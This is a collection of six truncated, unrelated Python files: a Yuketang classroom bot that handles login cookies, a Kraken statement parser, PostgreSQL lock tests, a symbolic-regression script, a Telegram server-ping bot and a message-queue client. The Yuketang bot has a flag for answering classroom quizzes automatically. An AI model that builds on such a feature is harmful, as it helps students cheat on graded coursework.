    "import asyncio\r\nimport websockets\r\nimport json\r\nimport requests\r\nimport os\r\nimport time\r\nimport traceback\r\nfrom util import *\r\nfrom send import *\r\nfrom random import *\r\n\r\ntimeout=30\r\n\r\ndomain='pro.yuketang.cn' # \u8377\u5858\u96e8\u8bfe\u5802\r\n\r\ncurrent_dir = os.path.dirname(os.path.abspath(__file__))\r\nos.chdir(current_dir)\r\n\r\nclass yuketang:\r\n    def __init__(self) -> None:\r\n        self.cookie=''\r\n        self.cookie_time=''\r\n        self.lessonIdNewList=[]\r\n        self.lessonIdDict = {}\r\n        self.classroomWhiteList = [] # \u8bfe\u7a0b\u767d\u540d\u5355\uff0c\u540d\u5b57\u91c7\u7528\u5b8c\u5168\u5339\u914d\uff0c\u4e3a\u7a7a\u65f6\u4e0d\u542f\u7528\r\n        self.clashroomBlackList = ['2023\u79cb-\u673a\u5668\u5b66\u4e60-0', '2023\u6e05\u534e\u5b9e\u8df5'] # \u8bfe\u7a0b\u9ed1\u540d\u5355\uff0c\u540d\u5b57\u91c7\u7528\u5b8c\u5168\u5339\u914d\uff0c\u4e3a\u7a7a\u65f6\u4e0d\u542f\u7528\r\n        self.wx=False # \u8bbe\u7f6e\u4e3aTrue\u65f6\u542f\u7528\u4f01\u4e1a\u5fae\u4fe1\u63a8\u9001\uff0c\u987b\u5728send.py\u8bbe\u7f6eCompanyId\u3001AgentId\u3001Secret\r\n        self.dd=False # \u8bbe\u7f6e\u4e3aTrue\u65f6\u542f\u7528\u9489\u9489\u63a8\u9001\uff0c\u987b\u5728send.py\u8bbe\u7f6eAppkey\u3001Appsecret\u3001RobotCode\u3001OpenConversationId\r\n        self.fs=False # \u8bbe\u7f6e\u4e3aTrue\u65f6\u542f\u7528\u98de\u4e66\u63a8\u9001\uff0c\u987b\u5728send.py\u8bbe\u7f6eAppId\u3001AppSecret\u3001OpenId\r\n        self.an=False # \u8bbe\u7f6e\u4e3aTrue\u65f6\u81ea\u52a8\u7b54\u9898\r\n        self.ppt=False # \u8bbe\u7f6e\u4e3aTrue\u65f6\u81ea\u52a8\u4e0b\u8f7dPPT\r\n        self.si=False # \u8bbe\u7f6e\u4e3aTrue\u65f6\u5b9e\u65f6\u63a8\u9001PPT\u8fdb\u5ea6\r\n        self.msgmgr=SendManager(wx=self.wx,dd=self.dd,fs=self.fs)\r\n\r\n    async def getcookie(self):\r\n        flag = 0\r\n        def read_cookie():\r\n            with open(\"cookie\", \"r\") as f:\r\n                lines = f.readlines()\r\n            self.cookie = lines[0].strip()\r\n            if len(lines) >= 2:\r\n                self.cookie_time = lines[1].strip()\r\n            else:\r\n                self.cookie_time = ''\r\n        while True:\r\n            if not os.path.exists(\"cookie\"):\r\n                flag = 1\r\n                self.msgmgr.sendMsg(\"\u6b63\u5728\u7b2c\u4e00\u6b21\u83b7\u53d6\u767b\u5f55cookie, \u8bf7\u5fae\u4fe1\u626b\u7801\")\r\n                await self.ws_controller(self.ws_login, retries=1000, delay=1)\r\n            if not self.cookie:\r\n                flag = 1\r\n                read_cookie()\r\n            if self.cookie_time and not check_time(self.cookie_time, 0):\r\n                flag = 1\r\n                self.msgmgr.sendMsg(f\"cookie\u5df2\u5931\u6548, \u8bf7\u91cd\u65b0\u626b\u7801\")\r\n                await self.ws_controller(self.ws_login, retries=1000, delay=1)\r\n                read_cookie()\r\n                continue\r\n            elif self.cookie_time and (not check_time(self.cookie_time, 2880) and datetime.now().minute < 5 or not check_time(self.cookie_time, 120)):\r\n                flag = 1\r\n                self.msgmgr.sendMsg(f\"cookie\u6709\u6548\u81f3{self.cookie_time}, \u5373\u5c06\u5931\u6548, \u8bf7\u91cd\u65b0\u626b\u7801\")\r\n                await self.ws_controller(self.ws_login, retries=0, delay=1)\r\n                read_cookie()\r\n                continue\r\n            code = self.check_cookie()\r\n            if code == 1:\r\n                flag = 1\r\n                self.msgmgr.sendMsg(f\"cookie\u5df2\u5931\u6548, \u8bf7\u91cd\u65b0\u626b\u7801\")\r\n                await self.ws_controller(self.ws_login, retries=1000, delay=1)\r\n                read_cookie()\r\n            elif code == 2:\r\n                self.msgmgr.sendMsg(f\"\u68c0\u6d4bcookie\u6709\u6548\u6027\u5931\u8d25\")\r\n            else:\r\n                if self.cookie_time and flag == 1 and check_time(self.cookie_time, 2880):\r\n                    self.msgmgr.sendMsg(f\"cookie\u6709\u6548\u81f3{self.cookie_time}\")\r\n                elif self.cookie_time and flag == 1:\r\n                    self.msgmgr.sendMsg(f\"cookie\u6709\u6548\u81f3{self.cookie_time}, \u5373\u5c06\u5931\u6548, \u4e0b\u4e2a\u5c0f\u65f6\u521d\u6ce8\u610f\u626b\u7801\")\r\n                elif flag == 1:\r\n                    self.msgmgr.sendMsg(f\"cookie\u6709\u6548, \u6709\u6548\u671f\u672a\u77e5\")\r\n                break\r\n\r\n    def weblogin(self,UserID,Auth):\r\n        url=f\"https://{domain}/pc/web_login\"\r\n        data={\r\n            \"UserID\":UserID,\r\n            \"Auth\":Auth\r\n        }\r\n        headers={\r\n            \"referer\":f\"https://{domain}/web?next=/v2/web/index&type=3\",\r\n            \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\",\r\n            \"Content-Type\":\"application/json\"\r\n        }\r\n        try:\r\n            res=requests.post(url=url,headers=headers,json=data,timeout=timeout)\r\n        except Exception as e:\r\n            print(f\"\u767b\u5f55\u5931\u8d25: {e}\")\r\n            return\r\n        cookies = res.cookies\r\n        self.cookie=\"\"\r\n        for k,v in cookies.items():\r\n            self.cookie += f'{k}={v};'\r\n        date = cookie_date(res)\r\n        if date:\r\n            content = f'{self.cookie}\\n{date}'\r\n            self.cookie_time = date\r\n        else:\r\n            content = self.cookie\r\n        with open(\"cookie\",\"w\")as f:\r\n            f.write(content)\r\n\r\n    def check_cookie(self):\r\n        info=self.get_basicinfo()\r\n        if not info:\r\n            return 2\r\n        if info.get(\"code\")==0:\r\n            return 0\r\n        return 1\r\n    \r\n    def setAuthorization(self,res,lessonId):\r\n        if res.headers.get(\"Set-Auth\") is not None:\r\n            self.lessonIdDict[lessonId]['Authorization']=\"Bearer \"+res.headers.get(\"Set-Auth\")\r\n\r\n    def get_basicinfo(self):\r\n        url=f\"https://{domain}/api/v3/user/basic-info\"\r\n        headers={\r\n            \"referer\":f\"https://{domain}/web?next=/v2/web/index&type=3\",\r\n            \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\",\r\n            \"cookie\":self.cookie\r\n        }\r\n      ",
    "import datetime, logging\r\nfrom Defaults import Defaults\r\nfrom StatementLine import StatementLine\r\n\r\nclass KrakenLine(StatementLine):\r\n\r\n  listData = ['txid',\r\n              'refid',\r\n              'time',\r\n              'type',\r\n              'subtype',\r\n              'aclass',\r\n              'asset',\r\n              'amount',\r\n              'fee',\r\n              'balance']\r\n\r\n  # To set the line type before calling parent\r\n  def __init__(self, textStatementLine, previousStatementLine=None):\r\n    self.lineType = \"Kraken\"\r\n\r\n    # Extra Kraken attributes\r\n    self.transactionId = None\r\n    self.asset = self.type = None\r\n    self.amount = self.cryptoFees = None\r\n\r\n    super().__init__(textStatementLine, previousStatementLine)\r\n\r\n  # Basic attribute getters\r\n  def getTransactionId(self):\r\n    return self.transactionId\r\n  def getType(self):\r\n    return self.type\r\n  def getAmount(self):\r\n    return self.amount\r\n  def getAsset(self):\r\n    return self.asset\r\n  def getFee(self):\r\n    return self.fee\r\n\r\n  # Role: try to extract if line matches Kraken statement\r\n  # 0: txid  1: refid  2: time\r\n  # 3: type  4: subtype\r\n  # 5: aclass  6: asset\r\n  # 7: amount\r\n  # 8: fee  9: balance\r\n  def extractInformation(self):\r\n    super().basicLineChecks()\r\n\r\n    # Split attributes of the CSV file\r\n    c = self.textStatementLine.split(\",\")\r\n    if len(c) != len(self.listData):\r\n      self.setNothingValid()\r\n      return False\r\n    \r\n    # Set raw data\r\n    try:\r\n      super().setRawData(c)\r\n    except IndexError:\r\n      self.setNothingValid()\r\n      return False\r\n\r\n    # Look for information in line\r\n    try:\r\n      # Remove all trailing double quotes\r\n      c = [x.strip('\"').strip() for x in c]\r\n\r\n      # If first ID is null we ignore it\r\n      if c[0] == \"\": return False\r\n\r\n      self.date = datetime.datetime.strptime(c[2], \"%Y-%m-%d %H:%M:%S\")\r\n      self.transactionId = c[1]\r\n      self.type = str(c[3])\r\n      self.asset = str(c[6])\r\n      self.amount = abs(float(c[7]))\r\n      self.fee = abs(float(c[8]))\r\n      self.lineFormatValid = True\r\n      self.lineWorthSomething = False\r\n\r\n      # If crypto was bought\r\n      #  (previous and current line are linked)\r\n      if (self.previousStatementLine and\r\n          self.type in [\"receive\", \"spend\"] and\r\n          self.previousStatementLine.getTransactionId() == self.transactionId and\r\n          self.previousStatementLine.getType() in [\"spend\", \"receive\"]):\r\n\r\n        if self.type == \"receive\" and self.previousStatementLine.getType() == \"spend\":\r\n          self.opType = \"Buy\"\r\n          self.crypto = KrakenLine.formatCrypto(c[6])\r\n          self.quantity = abs(float(c[7]))\r\n          self.spotCurrency = self.previousStatementLine.getAsset().split('.')[0]\r\n          self.subTotal = abs(float(self.previousStatementLine.getAmount()))\r\n          self.spotPrice = self.subTotal/self.amount # Estimated\r\n          self.fees = abs(float(self.previousStatementLine.getRawData()['fee']))\r\n          self.lineInformationComplete = True\r\n          self.discardPreviousLine = True\r\n          self.lineWorthSomething = True\r\n\r\n        elif self.type == \"spend\" and self.previousStatementLine.getType() == \"receive\":\r\n          self.opType = \"Buy\"\r\n          self.crypto = KrakenLine.formatCrypto(self.previousStatementLine.getAsset())\r\n          self.quantity = abs(float(self.previousStatementLine.getAmount()))\r\n          self.spotCurrency = c[6].split('.')[0]\r\n          self.subTotal = abs(float(c[7]))\r\n          self.spotPrice = self.subTotal/self.previousStatementLine.getAmount() # Estimated\r\n          self.fees = self.previousStatementLine.getFee()\r\n          self.lineInformationComplete = True\r\n          self.discardPreviousLine = True\r\n          self.lineWorthSomething = True\r\n\r\n      # If deposit not into Kraken EUR hold, count it as Buy\r\n      if c[3] == \"deposit\" and not \"HOLD\" in c[6]:\r\n        self.opType = \"Buy\"\r\n        self.crypto = KrakenLine.formatCrypto(c[6])\r\n        self.quantity = abs(float(c[7]))\r\n        self.spotCurrency = Defaults.CURRENCY\r\n        self.subTotal = None\r\n        self.spotPrice = None\r\n        self.cryptoFees = abs(float(c[8]))\r\n        self.lineWorthSomething = True\r\n\r\n      # If withdrawal from crypto account\r\n      if c[3] == \"withdrawal\":\r\n        self.opType = \"Send\"\r\n        self.crypto = KrakenLine.formatCrypto(c[6])\r\n        self.quantity = abs(float(c[7]))\r\n        self.spotCurrency = Defaults.CURRENCY\r\n        self.subTotal = None\r\n        self.spotPrice = None\r\n        self.cryptoFees = abs(float(c[8]))\r\n        self.totalWFees = None\r\n        self.lineWorthSomething = True\r\n\r\n    except Exception as e:\r\n      self.setNothingValid()\r\n      logging.debug(\"Couldn't extract information\")\r\n      return False # If failed to parse properly line\r\n\r\n  # Role: format crypto coming from Kraken statement line\r\n  # Examples: FIDA -> FIDA\r\n  #           XXBT -> BTC\r\n  #           XLTC -> LTC\r\n  @staticmethod\r\n  def formatCrypto(crypto):\r\n    if crypto[0] == 'X': crypto = ",
    "from __future__ import annotations\nfrom contextlib import contextmanager\nfrom dataclasses import dataclass\nimport enum\nimport json\nimport threading\nimport time\n\nfrom typing import Iterator\nimport psycopg\nimport pytest\n\nROOT_URL = \"postgres:///postgres\"\nURL = \"postgres:///pglockpy\"\nSET_UP_SQL = \"\"\"\n    CREATE TABLE t (id INT);\n    CREATE TABLE u (id INT);\n    CREATE TABLE v (with_unique_index INT UNIQUE);\n    CREATE MATERIALIZED VIEW mat AS SELECT * FROM t;\n    CREATE INDEX idx ON t (id);\n    CREATE OR REPLACE FUNCTION f() RETURNS TRIGGER AS $$ BEGIN RETURN NEW; END; $$ LANGUAGE plpgsql;\n    ALTER TABLE t ADD CONSTRAINT constr CHECK (id > 0) NOT VALID;\n    CREATE SEQUENCE seq;\n\"\"\"\n\n\n@dataclass\nclass Connections:\n    a: psycopg.Connection\n    b: psycopg.Connection\n    c: psycopg.Connection  # no implicit TRANSACTION\n\n\n@dataclass(frozen=True)\nclass Lock:\n    relation: str\n    lock_kind: LockKind\n\n    @staticmethod\n    def from_mode(relation: str, mode: str) -> Lock:\n        lock_kind = {\n            \"AccessExclusiveLock\": L.ACCESS_EXCLUSIVE,\n            \"ExclusiveLock\": L.EXCLUSIVE,\n            \"ShareRowExclusiveLock\": L.SHARE_ROW_EXCLUSIVE,\n            \"ShareLock\": L.SHARE,\n            \"ShareUpdateExclusiveLock\": L.SHARE_UPDATE_EXCLUSIVE,\n            \"RowExclusiveLock\": L.ROW_EXCLUSIVE,\n            \"RowShareLock\": L.ROW_SHARE,\n            \"AccessShareLock\": L.ACCESS_SHARE,\n        }[mode]\n        return Lock(relation, lock_kind)\n\n\n@pytest.fixture\ndef conns() -> Iterator[Connections]:\n    \"\"\"Whole fresh database with N connections per test.\n\n    Not quick, but simple.\n    \"\"\"\n    try:\n        with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n            conn.execute(\"DROP DATABASE pglockpy\")\n    except Exception:\n        pass\n\n    with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n        conn.execute(\"CREATE DATABASE pglockpy\")\n\n    with (\n        psycopg.connect(URL) as a,\n        psycopg.connect(URL) as b,\n        psycopg.connect(URL, autocommit=True) as c,\n    ):\n        a.execute(SET_UP_SQL)\n        a.commit()\n        yield Connections(a, b, c)\n\n\nclass LockKind(enum.Enum):\n    ACCESS_EXCLUSIVE = \"ACCESS EXCLUSIVE\"\n    EXCLUSIVE = \"EXCLUSIVE\"\n    SHARE_ROW_EXCLUSIVE = \"SHARE ROW EXCLUSIVE\"\n    SHARE = \"SHARE\"\n    SHARE_UPDATE_EXCLUSIVE = \"SHARE UPDATE EXCLUSIVE\"\n    ROW_EXCLUSIVE = \"ROW EXCLUSIVE\"\n    ROW_SHARE = \"ROW SHARE\"\n    ACCESS_SHARE = \"ACCESS SHARE\"\n    # SELECT ... FOR\n    FOR_UPDATE = \"FOR UPDATE\"\n    FOR_NO_KEY_UPDATE = \"FOR NO KEY UPDATE\"\n    FOR_SHARE = \"FOR SHARE\"\n    FOR_KEY_SHARE = \"FOR KEY SHARE\"\n\n\nL = LockKind\n\n\nclass Statement(enum.Enum):\n    DROP_TABLE = \"DROP TABLE t\"\n    TRUNCATE = \"TRUNCATE t\"\n    CREATE_TABLE = \"CREATE TABLE v (id INT)\"\n    ALTER_TABLE = \"ALTER TABLE t ADD COLUMN col INT\"\n    REINDEX = \"REINDEX TABLE t\"\n    VACUUM_FULL = \"VACUUM FULL\"\n    REFERESH_MATERIALIZED_VIEW = \"REFRESH MATERIALIZED VIEW mat\"\n    ALTER_TABLE_FOREIGN_KEY = (\n        \"ALTER TABLE t ADD CONSTRAINT fk FOREIGN KEY (id) REFERENCES u (id)\"\n    )\n    CREATE_TRIGGER = (\n        \"CREATE TRIGGER trig AFTER INSERT ON t FOR EACH ROW EXECUTE FUNCTION f()\"\n    )\n    CREATE_INDEX = \"CREATE INDEX idy ON t (id)\"\n    VACUUM = \"VACUUM\"\n    ANALYZE = \"ANALYZE\"\n    CREATE_INDEX_CONCURRENTLY = \"CREATE INDEX CONCURRENTLY idy ON t (id)\"\n    CREATE_STATISTICS = \"CREATE STATISTICS stat ON id FROM t\"\n    REINDEX_CONCURRENTLY = \"REINDEX TABLE CONCURRENTLY t\"\n    ALTER_TABLE_SET_STATISTICS = \"ALTER TABLE t ALTER COLUMN id SET STATISTICS 100\"\n    ALTER_TABLE_VALIDATE_CONSTRAINT = \"ALTER TABLE t VALIDATE CONSTRAINT constr\"\n    ALTER_INDEX_RENAME = \"ALTER INDEX idx RENAME TO idy\"\n    UPDATE = \"UPDATE t SET id = 4\"\n    UPDATE_UNIQUE = \"UPDATE v SET with_unique_index = 4\"\n    DELETE = \"DELETE FROM t\"\n    INSERT = \"INSERT INTO t VALUES (1)\"\n    MERGE = \"MERGE INTO t USING u AS sub ON t.id = u.id WHEN MATCHED THEN DO NOTHING\"\n    SELECT_FOR_UPDATE = \"SELECT * FROM t FOR UPDATE\"\n    SELECT_FOR_NO_KEY_UPDATE = \"SELECT * FROM t FOR NO KEY UPDATE\"\n    SELECT_FOR_SHARE = \"SELECT * FROM t FOR SHARE\"\n    SELECT_FOR_KEY_SHARE = \"SELECT * FROM t FOR KEY SHARE\"\n    SELECT = \"SELECT * FROM t\"\n\n    @property\n    def name_no_underscore(self) -> str:\n        return self.name.replace(\"_\", \" \")\n\n\n@dataclass\nclass LockRelationship:\n    original_lock: LockKind\n    doesnt_block: list[LockKind]\n    blocks: list[LockKind]\n\n\nTABLE_LOCK_RELATIONSHIPS = [\n    LockRelationship(\n        original_lock=L.ACCESS_EXCLUSIVE,\n        doesnt_block=[],\n        blocks=      [L.ACCESS_SHARE, L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.EXCLUSIVE,\n        doesnt_block=[L.ACCESS_SHARE],\n        blocks=      [                L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.SHARE_ROW_EXCLUSIVE,\n        d",
    "\"\"\"\n    This script is used to perform symbolic regression on crackpy grid data using the PhySO package.\n    The results are used in our work.\n    This configuration determines delta_x and delta_y for a pure mode I loading.\n    The code was adapted using the examples from:\n    https://github.com/WassimTenachi/PhySO/blob/main/demos/demos_sr/demo_mechanical_energy/demo_mechanical_energy.py\n\n    Needed:\n        - Folder with grid data files\n\n    Output:\n        - symbolic_regression folder containing the symbolic regression results\n\"\"\"\n\n# External packages\nimport torch\nimport numpy as np\nimport os\nimport matplotlib.pyplot as plt\nfrom datetime import datetime\nimport json\n\n# Internal code import\nfrom cracktipcorr.utils import read_grid_data\nimport physo\nfrom physo.learn import monitoring\nfrom physo.task import benchmark\n\n# Device\nDEVICE = 'cpu'\n# if torch.cuda.is_available():\n#    DEVICE = 'cuda'\nprint(f'Using device: {DEVICE}')\ntorch.cuda.is_available()\n\n# Fix seed for reproducibility to 42\ntorch.manual_seed(42)\nnp.random.seed(42)\n\n# #### Data points\n\n# Define the result files to read\nDATA_PATH = os.path.join('04_CrackPy_random_evaluation_pipeline', 'samples')\n\n# Chose if only mode I should be considered\nmode = 'II'\nwilliams_terms_a = ['a_-3', 'a_-2', 'a_-1', 'a_0', 'a_1', 'a_2', 'a_3', 'a_4', 'a_5', 'a_6', 'a_7']\nwilliams_terms_b = ['b_-3', 'b_-2', 'b_-1', 'b_0', 'b_1', 'b_2', 'b_3', 'b_4', 'b_5', 'b_6', 'b_7']\n\n# Create output directory if not existing\nLOG_DIR = '05_2_PhySO_log_mode_II'\nif not os.path.exists(LOG_DIR):\n    os.makedirs(LOG_DIR)\n\n# Define dictionary for json output\ndump_dict = {}\ndump_dict['williams_terms_a'] = williams_terms_a\ndump_dict['williams_terms_b'] = williams_terms_b\ndump_dict['mode'] = mode\ndump_dict['start_time'] = datetime.now()\n\n# Read data from each result file\na_data, b_data, delta_x, delta_y, training_data_files = read_grid_data(DATA_PATH,\n                                                                       only_mode=mode,\n                                                                       williams_terms_a=williams_terms_a,\n                                                                       williams_terms_b=williams_terms_b,\n                                                                       endswith=\"samples.csv\")\n\n# Dataset\nprint(f'The dataset contains {len(a_data)} samples from {len(training_data_files)} files.')\ndump_dict['training_data_files'] = training_data_files\n\n# Create the input and output data for regression\nX_array = np.concatenate((a_data, b_data), axis=1).T\n\ntrainings = [[delta_x, 'dx'],\n             [delta_y, 'dy']]\n\nfor y_array, name in trainings:\n    LOG_PATH = os.path.join(LOG_DIR, name)\n\n    # Create output directory if not existing\n    if not os.path.exists(LOG_PATH):\n        os.makedirs(LOG_PATH)\n\n    # Save the data\n    n_dim = X_array.shape[0]\n    fig, ax = plt.subplots(n_dim, 1, figsize=(10, 5))\n    for i in range(n_dim):\n        curr_ax = ax if n_dim == 1 else ax[i]\n        curr_ax.plot(X_array[i], y_array, 'k.', )\n        curr_ax.set_xlabel(\"X[%i]\" % (i))\n        curr_ax.set_ylabel(\"y\")\n    plt.savefig(os.path.join(LOG_PATH, 'inp_data.png'))\n\n    # #### Run config\n    # Stack of all input variables\n    X = torch.tensor(X_array).to(DEVICE)\n    # Output of symbolic function to guess\n    y = torch.tensor(y_array).to(DEVICE)\n\n    # ------ Constants ------\n    const1 = torch.tensor(np.array(1.)).to(DEVICE)\n    const2 = torch.tensor(np.array(2.)).to(DEVICE)\n    const3 = torch.tensor(np.array(4.)).to(DEVICE)\n\n    # ### Library config\n    args_make_tokens = {\n        # operations\n        \"op_names\": [\"mul\", \"add\", \"sub\", \"div\", \"abs\", \"inv\", \"n2\", \"neg\", \"exp\", \"log\"],\n        \"use_protected_ops\": True,\n        # input variables\n        \"input_var_ids\": {\"a_(-3)\": 0,\n                          \"a_(-2)\": 1,\n                          \"a_(-1)\": 2,\n                          \"a_(0)\": 3,\n                          \"a_(1)\": 4,\n                          \"a_(2)\": 5,\n                          \"a_(3)\": 6,\n                          \"a_(4)\": 7,\n                          \"a_(5)\": 8,\n                          \"a_(6)\": 9,\n                          \"a_(7)\": 10,\n                          \"b_(-3)\": 11,\n                          \"b_(-2)\": 12,\n                          \"b_(-1)\": 13,\n                          \"b_(0)\": 14,\n                          \"b_(1)\": 15,\n                          \"b_(2)\": 16,\n                          \"b_(3)\": 17,\n                          \"b_(4)\": 18,\n                          \"b_(5)\": 19,\n                          \"b_(6)\": 20,\n                          \"b_(7)\": 21, },\n        # Units: $\\text{N} \\cdot \\text{mm}^{-1-n/2}$\n        \"input_var_units\": {\"a_(-3)\": [1, 1 / 2],\n                            \"a_(-2)\": [1, 0],\n                            \"a_(-1)\": [1, -1 / 2],\n                            \"a_(0)\": [1, -1],\n                            \"a_(1)\": [1, -3 / 2],\n                            \"a_(2)\": [1, -2],\n                            \"a_(3)\": [1, -5 / ",
    "from telegram import Update\nfrom telegram.ext import Updater, CommandHandler, CallbackContext\nimport requests\nimport json\nimport os\nimport subprocess\nimport time\nimport jdatetime\nimport datetime\nimport pytz\nimport pycountry\n\ndirname = os.path.dirname(__file__)\njson_conf = os.path.join(dirname, 'conf.json')\nurl = \"https://check-host.net\"\ncolor_flag = {\n    4: \"\ud83d\udfe2\",\n    3: \"\ud83d\udfe1\",\n    2: \"\ud83d\udfe0\",\n    1: \"\ud83d\udd34\",\n    0: \"\u26a0\ufe0f\"\n}\nstart_cmd_msg = \"Welcome to the Ping Bot! \ud83d\udc4b\\n\\nThis bot checks the status of your servers every hour and sends you the results.\"\nip_cmd_msg = \"\ud83e\ude84 Command: /ip\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Add IP: /ip add 127.0.0.1\\n\ud83d\udd38 Remove IP: /ip rm 127.0.0.1\\n\ud83d\udd38 List Servers IP: /ip list\"\ncc_cmd_msg = \"\ud83e\ude84 Command: /cc\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Change Country: /cc ir\"\nnode_cmd_msg = \"\ud83e\ude84 Command: /node\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Change Node: /node ir\\n\\n\ud83d\udef0 Available Nodes:\\n\\nbr,bg,hr,cz,fi,fr,de,hk,in,ir,il,it,jp,kz,lt,md,nl,pl,pt,ru,rs,es,ch,tr,ae,uk,ua,us\"\nres_cmd_msg = \"\ud83e\ude84 Command: /res\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Restart Bot: /res\"\ncmd_msg = \"\ud83e\ude84 Bot Commands:\\n\\n\ud83d\udd38 Show this Message: /cmd\\n\ud83d\udd38 Add/Remove/List Servers IP: /ip\\n\ud83d\udd38 Ping Servers IP: /ping\\n\ud83d\udd38 Change Country: /cc\\n\ud83d\udd38 Change Node: /node\\n\ud83d\udd38 Restart Bot: /res\"\n\ndef handle_json(job, key, value):\n    with open(json_conf, 'r') as file:\n        data = json.load(file)\n    if job == \"get\":\n        return data[key]\n    else:\n        if job == \"add\":\n            data[\"servers\"].append(value)\n        elif job == \"rm\":\n            data[\"servers\"].remove(value)\n        elif job == \"rep\":\n            data[key] = value\n        with open(json_conf, 'w') as file:\n            json.dump(data, file, indent=4)\n\ndef json_data():\n    user_id = int(handle_json(\"get\", \"user_id\", \"\"))\n    token = handle_json(\"get\", \"bot_token\", \"\")\n    servers = handle_json(\"get\", \"servers\", \"\")\n    ccode = handle_json(\"get\", \"ccode\", \"\")\n    cnode = handle_json(\"get\", \"node\", \"\")\n    data_dict = {\"user_id\": user_id,\n                 \"token\": token,\n                 \"servers\": servers,\n                 \"ccode\": ccode,\n                 \"cnode\": cnode\n                 }\n    return data_dict\n\ndef time_calc(ccode):\n    try:\n        country_timezones = pytz.country_timezones(ccode.upper())\n    except:\n        country_timezones = None\n    if country_timezones and ccode == \"ir\":\n        tz = pytz.timezone(country_timezones[0])\n        now = jdatetime.datetime.now(tz=tz)\n    elif country_timezones:\n        tz = pytz.timezone(country_timezones[0])\n        now = datetime.datetime.now(tz=tz)\n    else:\n        tz = pytz.timezone('UTC')\n        now = datetime.datetime.now(tz=tz)\n    time_seconds = int(now.timestamp())\n    date_str = now.strftime(f'{tz}: %Y/%m/%d %H:%M:%S')\n    return int(time_seconds), date_str\n\ndef authenticate_user(func):\n    def for_function(update: Update, context: CallbackContext):\n        user = update.effective_chat.id\n        if json_data()[\"user_id\"] == user:\n            return func(update, context)\n        else:\n            pass\n    return for_function\n\ndef get_nodes(code):\n    code = code.lower()\n    try:\n        response = requests.get(f\"{url}/nodes/hosts\")\n    except:\n        time.sleep(20)\n        get_nodes(code)\n    data = json.loads(response.text)\n    country_nodes = []\n    location = []\n    for node, info in data[\"nodes\"].items():\n        if node.startswith(code):\n            location = info[\"location\"]\n            city = location[2]\n            country_nodes.append({\"name\": city, \"node\": node})\n    if len(location) > 1 and location[1] != \"\":\n        country = location[1]\n    else:\n        country = False\n        country_nodes = False\n    return country, country_nodes\n\ndef check_host(context: CallbackContext):\n    user_id = json_data()[\"user_id\"]\n    servers = json_data()[\"servers\"]\n    ccode = json_data()[\"ccode\"]\n    cnode = json_data()[\"cnode\"]\n    selected_node = get_nodes(cnode)\n    if (selected_node[0] is not False and selected_node[1] is not False) and (selected_node[0] is not [] and selected_node[1] is not []):\n        country = selected_node[0]\n        nodes = selected_node[1]\n        time_date = time_calc(ccode)[1]\n        context.bot.send_message(chat_id=user_id, text=f\"\ud83d\udef0 Pinging Started:\\n\\n\ud83d\uddd3 {time_date}\")\n        for server in servers:\n            ping_link = f\"{url}/check-ping?host={server}\"\n            for node in nodes:\n                ping_link += f'&node={node[\"node\"]}'\n            ping_response = requests.get(ping_link, headers={\"Accept\": \"application/json\"})\n            time.sleep(20)\n            ping_data = json.loads(ping_response.text)\n            result_link = f\"{url}/check-result/{ping_data['request_id']}\"\n            result_response = requests.get(result_link, headers={\"Accept\": \"application/json\"})\n            if result_response.status_code == 200:\n                try:\n                    stat = []\n                    result_data = result_response.json()\n                    node_index = 0\n                    for pings in result_data.values():\n                        successful_pings = 0\n           ",
    "import aiohttp\nfrom pydantic import AnyUrl\n\n\nclass LowMqClient:\n    def __init__(self, auth_key: str, lowmq_url: AnyUrl):\n        self.auth_key = auth_key\n        self.lowmq_url = lowmq_url\n        self.session = None\n\n    async def __aenter__(self):\n        self.session = aiohttp.ClientSession()\n        return self\n\n    async def __aexit__(self, exc_type, exc, tb):\n        await self.session.close()\n\n    async def set_auth_key(self, auth_key):\n        self.auth_key = auth_key\n\n    async def set_lowmq_url(self, lowmq_url):\n        self.lowmq_url = lowmq_url\n\n    async def add_packet(self, queue_name, payload, freeze_time_min=5):\n        url = f\"{self.lowmq_url}/msg?freezeTimeMin={freeze_time_min}\"\n        headers = {\n            \"Authorization\": f\"token {self.auth_key}\",\n            \"Content-Type\": \"application/json\",\n        }\n        data = {\"key\": queue_name, \"value\": payload}\n\n        async with self.session.post(url, headers=headers, json=data) as response:\n            response_data = await response.json()\n            return response_data\n\n    async def get_packet(self, queue_name, delete=False):\n        url = f\"{self.lowmq_url}/msg?key={queue_name}&delete={str(delete).lower()}\"\n        headers = {\"Authorization\": f\"token {self.auth_key}\"}\n\n        async with self.session.get(url, headers=headers) as response:\n            response_data = await response.json()\n            return response_data\n\n    async def delete_packet(self, queue_name, packet_id):\n        url = f\"{self.lowmq_url}/msg?key={queue_name}&_id={packet_id}\"\n        headers = {\"Authorization\": f\"token {self.auth_key}\"}\n\n        async with self.session.delete(url, headers=headers) as response:\n            if response.status == 200:\n                return True\n            else:\n                return False\n",
